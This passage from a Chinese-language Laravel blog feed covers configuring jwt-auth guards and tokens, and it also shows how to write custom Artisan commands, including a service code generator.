=&gt; <span class="string">'web'</span>,</span><br><span class="line">    <span class="string">'passwords'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义 guard</span></span><br><span class="line"><span class="string">'guards'</span> =&gt; [</span><br><span class="line">    <span class="string">'web'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'session'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="string">'api'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'jwt'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'users'</span>,</span><br><span class="line">    ],</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// provider 的作用是指定认证所需的数据表或者模型，推荐使用 eloquent</span></span><br><span class="line"><span class="string">'providers'</span> =&gt; [</span><br><span class="line">    <span class="string">'users'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'eloquent'</span>,</span><br><span class="line">        <span class="string">'model'</span> =&gt; App\User::class,</span><br><span class="line">    ],</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 'users' =&gt; [</span></span><br><span class="line">    <span class="comment">//     'driver' =&gt; 'database',</span></span><br><span class="line">    <span class="comment">//     'table' =&gt; 'users',</span></span><br><span class="line">    <span class="comment">// ],</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>如果你使用默认的 User 模型来生成 token，那么该模型需要继承 <code>Tymon\JWTAuth\Contracts\JWTSubject</code> 接口，并实现接口的两个方法 <code>getJWTIdentifier()</code> 和 <code>getJWTCustomClaims()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Tymon</span>\<span class="title">JWTAuth</span>\<span class="title">Contracts</span>\<span class="title">JWTSubject</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Auth</span>\<span class="title">User</span> <span class="title">as</span> <span class="title">Authenticatable</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Authenticatable</span> <span class="keyword">implements</span> <span class="title">JWTSubject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getJWTIdentifier</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getKey();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getJWTCustomClaims</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getJWTIdentifier</code> 返回了 User 的 id（用于生成 Token），<code>getJWTCustomClaims</code> 是我们需要额外在 JWT 载荷中增加的自定义内容，这里返回空数组。</p><p>打开Tinker，尝试生成一个 token：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; $user = User::first();</span><br><span class="line">&gt;&gt;&gt; Auth::guard(<span class="string">'api'</span>)-&gt;login($user);</span><br><span class="line"></span><br><span class="line">=&gt; <span class="string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9hdWN0aW9uLnNtaHN3LmxvY2FsIiwiaWF0IjoxNjIyOTY2OTM3LCJleHAiOjE2MjMwNTMzMzcsIm5iZiI6MTYyMjk2NjkzNywianRpIjoibVJKY2wzVWlOMURTQWg2WSIsInN1YiI6MSwicHJ2IjoiMThiMDU4NmY1NWY5YjVhYzc3NmY3MjU3ZTNiODdkMzY2ZjZjNWM3MSJ9.bKFU2T2b-L_nF6uiwb6gZm76aGcWraZ0Bo9O6Xz5Tqw"</span></span><br></pre></td></tr></table></figure><p>除了上面介绍的这种基于用户实例，返回Token的方式，还有另外两种方式可以创建Token：</p><ol><li><p>基于账密参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$credentials = request([<span class="string">'email'</span>, <span class="string">'password'</span>]); </span><br><span class="line">$token = auth()-&gt;attempt($credentials)</span><br></pre></td></tr></table></figure></li><li><p>基于模型中的用户主键 id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$token = auth()-&gt;tokenById(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ol><p>拿到Token 之后，有两种使用方法：</p><ol><li>加到 url 中：<code>?token=你的token</code></li><li>加到 authorization 或者 header 中，建议用后者，因为在 https 情况下更安全：<code>Authorization:Bearer 你的token</code></li></ol><p><code>jwt-auth</code> 有两个重要的参数，可以在 <code>.env</code> 中进行设置：</p><ul><li><code>JWT_TTL</code>：生成的 token 在多少分钟后过期，默认 60 分钟</li><li><code>JWT_REFRESH_TTL</code>：生成的 token，在多少分钟内，可以刷新获取一个新 token，默认 20160 分钟，即 14 天。</li></ul><p>这里解释一下这两个参数是怎么回事：</p><ul><li><code>token</code> 的过期时间是出于安全性考虑</li><li><code>token_refresh</code> 的过期时间是出于用户体验考虑</li></ul><p>出于安全性考虑，不会给用户下发永久有效的token，用户需要每隔一段时间来用过期的token 来跟服务器换取一个新的 token。</p><p>打个比方：</p><blockquote><p>你在食堂办理了一张饭卡，有效期是1个月，每个月初都要去食堂激活一次，以整明你还在学校念书。<br>如果超过3个月内都没有激活这张饭卡，则视为该名学生已经不在学校，如果3个月后这名学生回来食堂吃饭，需要重新办理饭卡</p></blockquote><p>同样的道理转换到token，只是这个激活步骤不需要用户真的去操作，这个是我们来做的，全程用户都是无感的（这个是后面的无痛刷新 token 的内容）。</p><h3 id="使用详解"><a href="#使用详解" class="headerlink" title="使用详解"></a>使用详解</h3><p>Token 拿到之后，如何应用到项目中呢？</p><p>需要配合 <code>auth:api</code> 中间件使用，你肯定会觉得奇怪，这个中间件好像没有在任何地方定义，怎么就能使用？</p><p>打开<code>app\Http\Kernel.php</code>，可以看到默认的路由中间件列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $routeMiddleware = [</span><br><span class="line">    <span class="string">'auth'</span> =&gt; \Illuminate\Auth\Middleware\Authenticate::class,</span><br><span class="line">    <span class="string">'auth.basic'</span> =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,</span><br><span class="line">    <span class="string">'bindings'</span> =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line">    <span class="string">'cache.headers'</span> =&gt; \Illuminate\Http\Middleware\SetCacheHeaders::class,</span><br><span class="line">    <span class="string">'can'</span> =&gt; \Illuminate\Auth\Middleware\Authorize::class,</span><br><span class="line">    <span class="string">'guest'</span> =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class,</span><br><span class="line">    <span class="string">'signed'</span> =&gt; \Illuminate\Routing\Middleware\ValidateSignature::class,</span><br><span class="line">    <span class="string">'throttle'</span> =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>可以发现 <code>auth</code> 就是第一个中间件的别名，但是 <code>auth:api</code> 又是哪里来的呢？</p><p><code>api</code> 是 <code>auth</code> 的路由参数，指定了要使用哪个看守器，这里指定使用 <code>api</code> 看守器，也就是 <code>auth.php</code> 中配置的 <code>api</code> 守卫：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'guards'</span> =&gt; [</span><br><span class="line">    <span class="string">'api'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'jwt'</span>,</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'user'</span>,</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>所以<code>auth:api</code> 并不是哪里自定义的别名中间件。</p><p>如果直接使用<code>auth</code> 中间件，相当于使用 <code>auth.php</code> 中指定的 <code>defaults</code> 看守器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 路由中使用</span></span><br><span class="line">Route::middleware(<span class="string">"auth.admin"</span>)-&gt;group(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制器中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware(<span class="string">'auth:api'</span>, [<span class="string">'except'</span> =&gt; [<span class="string">'login'</span>]]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试根据提供的凭证验证用户是否合法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">attempt</span><span class="params">(array $credentials = [], $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 一次性登录，不记录session or cookie</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">once</span><span class="params">(array $credentials = [])</span></span>;</span><br><span class="line"><span class="comment">// 登录用户，通常在验证成功后记录 session 和 cookie </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(Authenticatable $user, $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 使用用户 id 登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginUsingId</span><span class="params">($id, $remember = false)</span></span>;</span><br><span class="line"><span class="comment">// 使用用户 ID 登录，但是不记录 session 和 cookie</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onceUsingId</span><span class="params">($id)</span></span>;</span><br><span class="line"><span class="comment">// 通过 cookie 中的 remember token 自动登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">viaRemember</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 登出</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前用户是否登录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 判断当前用户是否是游客（未登录）</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">guest</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 获取当前认证的用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 获取当前认证用户的 id，严格来说不一定是 id，应该是上个模型中定义的唯一的字段名</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">id</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 根据提供的消息认证用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">(array $credentials = [])</span></span>;</span><br><span class="line"><span class="comment">// 设置当前用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUser</span><span class="params">(Authenticatable $user)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/10885/full-use-of-jwt" target="_blank" rel="noopener">JWT 完整使用详解</a></li><li><a href="https://learnku.com/articles/10889/detailed-implementation-of-jwt-extensions#35808e" target="_blank" rel="noopener">JWT 扩展具体实现详解</a></li><li><a href="https://jwt-auth.readthedocs.io/en/develop/quick-start/" target="_blank" rel="noopener">jwt-auth Quick start</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Artisan 自定义命令</title>
      <link href="/laravel-artisan-custom-commands/"/>
      <url>/laravel-artisan-custom-commands/</url>
      
        <content type="html"><![CDATA[<p>Laravel 主要提供了三种实现命令行交互的工具：</p><ol><li>Artisan：内置一套命令行操作，并可以自定义进行扩展</li><li>Tinker：为应用提供了 REPL 或者交互的 shell</li><li>安装器：通常在项目初始化时用到</li></ol><p>本章的内容主要以 Artisan 命令为主。</p><a id="more"></a><h2 id="Artisan-基本命令"><a href="#Artisan-基本命令" class="headerlink" title="Artisan 基本命令"></a>Artisan 基本命令</h2><ul><li><code>help</code> 帮助命令，例如 <code>php artisan help commandName</code></li><li><code>clear-compiled</code> 删除 Laravel 的编译文件（就像一个内部缓存），当遇到一些奇怪的问题时，可以先尝试运行这个命令</li><li><code>down</code> 把应用切换到『维护模式』以解决错误、迁移或者其他运行方式。up 可以在『维护模式』里恢复应用</li><li><code>env</code> 显示当时Laravel 的运行环境，它等效于在应用中输入 <code>app()-&gt;environment()</code></li><li><code>migrate</code> 迁移数据库</li><li><code>optimize</code> 通过把重要的PHP 类缓存到 <code>bootstrap/cache/compile.php</code> 来优化应用</li><li><code>serve</code> 部署一个PHP 服务器到 <code>localhost:8000</code>（可以通过 –host 和 -port 自定义修改主机名和端口号）</li><li><code>tinker</code> 打开Tinker 的REPL</li></ul><h2 id="组合命令"><a href="#组合命令" class="headerlink" title="组合命令"></a>组合命令</h2><p>Laravel 内置了许多好用的组合命令。</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>为了更快地查阅，<code>config:cache</code> 会缓存所有的配置，<code>config:clear</code> 会清理缓存。</p><h3 id="db"><a href="#db" class="headerlink" title="db"></a>db</h3><p>如果已经配置了数据库的 <code>seeder</code>，便可以用 <code>db:seed</code> 命令，来填充数据库。</p><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p><code>key:generate</code> 会在 <code>.env</code> 文件中创建一个随机的应用加密密钥，用于对数据进行加密。</p><blockquote><p>注意：这个命令只需要运行一次，也就是初始环境时，如果再次运行，则会丢失原有的密钥。</p></blockquote><h3 id="make"><a href="#make" class="headerlink" title="make"></a>make</h3><ul><li><code>make:command</code>：创建一个新的 Artisan 命令</li><li><code>make:controller</code>：生成 Controller</li><li><code>make:request</code>：生成 Request</li><li><code>make:resource</code>：生成 Resource</li><li><code>make:exception</code>：生成 Exception</li><li><code>make:job</code>：创建延迟任务</li></ul><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><ul><li><code>queue:listen</code>：开始监听一个队列</li><li><code>queue:table</code>：为数据库支持队列创建一个迁移</li><li><code>queque:flush</code>：刷新所有失败的队列任务</li></ul><h3 id="route"><a href="#route" class="headerlink" title="route"></a>route</h3><ul><li><code>route:list</code>：查看应用的每一个路由定义，包括每个路由器的方法、路径、名字、控制器/闭包动作和中间件。</li><li><code>route:cache</code>：缓存路由器的定义，以便更快地查阅</li><li><code>route:clear</code>：清理控制器</li></ul><h2 id="自定义Artisan-命令"><a href="#自定义Artisan-命令" class="headerlink" title="自定义Artisan 命令"></a>自定义Artisan 命令</h2><p>先来创建一个新的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:command yourCommand</span><br></pre></td></tr></table></figure><p>先来看一下Artisan 命令的默认架构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Console</span>\<span class="title">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yourCommand</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台命令名称和签名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $signature = <span class="string">'command:name'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台命令描述</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $description = <span class="string">'Command description'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的命令实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行控制台命令</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>$signature</code>：用于定义命令签名，比如签名是 <code>command:name</code>，那么最终执行的命令应该是：<code>php artisan command:name</code></li><li><code>$description</code>：对于该命令的描述</li><li><code>handle()</code>：执行命令所需要做的事情</li></ul><p>在 <code>handle()</code> 中检索命令行参数和选项值：</p><ul><li><code>argument()</code>：返回一个包含所有参数的数组</li><li><code>option()</code>：返回一个包含所有选项的数组</li></ul><p>在 <code>handle()</code> 中获取用户输入：</p><ul><li><code>ask()</code>：提示用户输入文本</li><li><code>secret()</code>：提示用户输入文本，但是会用星号来隐藏输入内容</li><li><code>confirm()</code>：提示用户恢复 是/否，返回一个布尔值</li><li><code>choice()</code>：提示用户选择一个选项，如果用户没有选择，那么最后一个参数就会使用默认值</li></ul><h3 id="Code-generator"><a href="#Code-generator" class="headerlink" title="Code generator"></a>Code generator</h3><p>Laravel 默认为我们提供了，<code>make:controller</code> 这样的生成控制器的命令，那如果需要生成自定义的代码，又该如何做呢？</p><p>这里以 <code>Service</code> 为例，首先创建命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:command MakeService</span><br></pre></td></tr></table></figure><p>编辑<code>app/Console/Command/MakeService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Console</span>\<span class="title">Commands</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Console</span>\<span class="title">GeneratorCommand</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generator Service</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Class MakeService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Console\Commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeService</span> <span class="keyword">extends</span> <span class="title">GeneratorCommand</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">'make:service'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $description = <span class="string">'Create a new custom service class'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The type of class being generated.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $type = <span class="string">'Service'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the stub file for the generator.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getStub</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__DIR__</span> . <span class="string">'/stubs/service.stub'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the default namespace for the class.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $rootNamespace</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getDefaultNamespace</span><span class="params">($rootNamespace)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $rootNamespace . <span class="string">'\Services'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过实现 <code>GeneratorCommand</code> 抽象类来生成代码，同时需要在 <code>MakeService.php</code> 同级目录下创建一个 <code>stubs/service.stub</code> 文件，并填入相应的模板文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace &#123;&#123; namespace &#125;&#125;;</span><br><span class="line"></span><br><span class="line">class &#123;&#123; class &#125;&#125;</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; $this-&gt;$model &#x3D; $model;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最红使用 <code>php artisan make:service TestService</code> 命令，就可以生成Service 了～</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Request 常见表单验证整理</title>
      <link href="/laravel-request-common-form-validation-finishing/"/>
      <url>/laravel-request-common-form-validation-finishing/</url>
      
